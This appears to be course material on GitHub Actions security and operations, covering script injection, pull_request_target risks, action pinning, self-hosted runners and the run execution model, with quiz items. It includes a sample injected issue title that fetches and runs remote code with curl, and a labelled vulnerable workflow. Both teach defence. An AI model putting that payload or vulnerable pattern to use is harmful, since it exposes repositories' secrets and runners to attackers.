**Script injection.** `${{ }}` is substituted into the script text before bash runs. `run: echo "${{ github.event.issue.title }}"` with a title like `"; curl evil.sh | sh; "` executes attacker code. Anything a user controls (titles, bodies, branch names, commit messages) must go through `env:` and be referenced as a quoted shell variable.

**pull_request_target and workflow_run.** These run in the context of the base repository **with secrets and a write token**, even for fork PRs. That is fine for labelling, but if the workflow checks out and builds the PR's head code, the attacker's code runs with your secrets. Since `actions/checkout` v7, checking out fork PR code in these triggers is refused unless you set `allow-unsafe-pr-checkout: true`; don't. Never build untrusted code there; split into an unprivileged `pull_request` build and a privileged follow-up that only consumes its artifacts as data.

**Supply chain.** Tags of third-party actions can be moved to malicious code, as happened in the 2025 tj-actions/changed-files compromise. Pin third-party actions to full commit SHAs and let Dependabot update them.

**Least privilege.** Set `permissions: contents: read` at the top, elevate per job, prefer OIDC over stored keys, protect environments, and require approval for workflows from first-time contributors. Static analysers such as `actionlint` and `zizmor` catch many of these issues in review.
concepts.code:
# VULNERABLE: title is pasted into the script before bash runs
- run: echo "New issue ${{ github.event.issue.title }}"

# SAFE: pass untrusted data as an environment variable
- run: echo "New issue $TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}

# DANGEROUS combination: privileged trigger + untrusted checkout
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # attacker's code
          allow-unsafe-pr-checkout: true   # checkout v7 refuses without it
      - run: npm ci && npm test    # runs it with secrets available
takeaways: Never interpolate user-controlled ${{ }} values into run scripts; use env
pull_request_target + checking out PR code = secrets exposed to forks
Pin third-party actions to SHAs and default to read-only permissions
pitfalls: Believing quotes around ${{ }} inside run make it safe; the attacker can close the quotes.

quiz.q: Why is run: echo "${{ github.head_ref }}" risky in a PR workflow?
options: A branch name chosen by the PR author is pasted into the script and can contain shell syntax
quiz.explain: Expressions are substituted before the shell parses the script, so attacker-controlled text becomes code.

concepts.name: Self-hosted and larger runners
concepts.summary: Run jobs on your own machines or autoscaled Kubernetes pods, select them with labels and groups, and keep them safe.
concepts.why: Special hardware, private networks or very high volume make GitHub-hosted runners too limited or too expensive.
concepts.body:
GitHub-hosted runners are fresh VMs per job. Alternatives:

- **Larger runners**: GitHub-hosted machines with more CPU and RAM, GPUs or static IPs, configured per organization and selected by label.
- **Self-hosted runners**: the open-source runner application installed on your own machine or VM. It opens an outbound HTTPS long-poll to GitHub to receive jobs, so no inbound firewall rules are needed.

Jobs select runners with `runs-on`, which can be a label list such as `[self-hosted, linux, x64, gpu]` (all must match) or `group:` plus `labels:` for runner groups. Runner groups control which repositories may use which runners.

The big caveat: a self-hosted runner is **not reset** between jobs unless you make it so. Files, processes, Docker images and credentials can survive from one job to the next. For that reason GitHub warns against self-hosted runners on public repositories, where any fork PR could run code on your machine. Prefer **ephemeral** runners (`--ephemeral`) that take a single job and are destroyed.

At scale, **Actions Runner Controller (ARC)** runs ephemeral runners as Kubernetes pods using runner scale sets, scaling from zero with demand. Keep runners patched, give them minimal cloud permissions and isolate them per trust level.
concepts.code:
# Register an ephemeral runner (token from Settings > Actions > Runners)
./config.sh --url https://github.com/my-org --token "$REG_TOKEN" \
  --labels gpu,linux-x64 --runnergroup ml --ephemeral --unattended
./run.sh        # takes exactly one job, then exits

# Workflow side (YAML):
#   runs-on: [self-hosted, gpu]
#   or
#   runs-on:
#     group: ml
#     labels: [gpu]

# Kubernetes: Actions Runner Controller scale set via Helm
helm install arc-runners \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set \
  --namespace arc-runners --set githubConfigUrl=https://github.com/my-org
takeaways: Self-hosted runners poll GitHub over outbound HTTPS
runs-on labels must all match; runner groups limit repository access
Use ephemeral runners or ARC so no state leaks between jobs
pitfalls: Attaching a persistent self-hosted runner to a public repository, letting fork PRs run code on it.

options: Each job starts on a clean machine, so nothing leaks between jobs
They allow more than 256 matrix jobs
quiz.explain: A persistent runner keeps files, processes and credentials from earlier jobs.

concepts.name: How runs are created and executed
concepts.summary: Which workflow file version runs for each event, how jobs are queued and expanded, and the limits that shape large pipelines.
concepts.why: Understanding the execution model explains puzzling behaviour like edits not taking effect or runs that never start.
concepts.body:
When an event arrives, GitHub reads `.github/workflows/` **at a specific commit**, which depends on the event: the pushed commit for `push`, the PR merge commit for `pull_request`, the default branch for `schedule`, `workflow_dispatch` defaults and `pull_request_target`. That is why a fix to a scheduled workflow only matters once merged to the default branch, and why `pull_request_target` uses the base branch's trusted copy.

Each matching workflow becomes a **run** with a `run_id`, a `run_number` and an attempt count for re-runs. GitHub evaluates the job graph: jobs whose `needs` are met and whose job-level `if` is true are queued; matrices are expanded into individual jobs at that point, which is why a matrix can depend on an earlier job's output.

A queued job waits for a runner matching its `runs-on` labels. Hosted runners are limited by your plan's concurrent job quota; self-hosted ones by how many are online. A job with no matching runner waits up to 24 hours before failing.

On the runner, the **runner application** downloads all referenced actions first (so a broken `uses:` fails before any step), then executes steps, streaming logs back. Limits to remember: jobs run at most 6 hours on hosted runners, workflow runs at most 35 days, and re-running failed jobs reuses the same commit and workflow definition.
concepts.code:
# Inspect runs and attempts with the GitHub CLI
gh run list --workflow ci.yml --limit 3
# STATUS  TITLE        WORKFLOW  BRANCH  EVENT         ID
# ✓       Fix parser   CI        main    push          123456789
gh run view 123456789 --log-failed     # only the failing steps' logs
gh run rerun 123456789 --failed        # new attempt, same commit and YAML
gh workflow run deploy.yml -f environment=staging   # workflow_dispatch
gh run watch                            # follow a run live
takeaways: The workflow file is read at the event's commit (default branch for schedule)
Matrices expand when a job becomes ready, so they can use earlier outputs
Re-runs reuse the original commit and workflow definition
pitfalls: Editing a workflow and re-running an old run, expecting the edit to apply.

quiz.q: You fix a bug in a workflow on a feature branch, then re-run last night's failed scheduled run. Does it use the fix?
options: Yes, re-runs read the latest file
Yes, if the branch is protected
No, scheduled runs use the default branch and re-runs reuse the original definition
quiz.explain: A re-run reproduces the original commit and workflow; schedules always use the default branch.
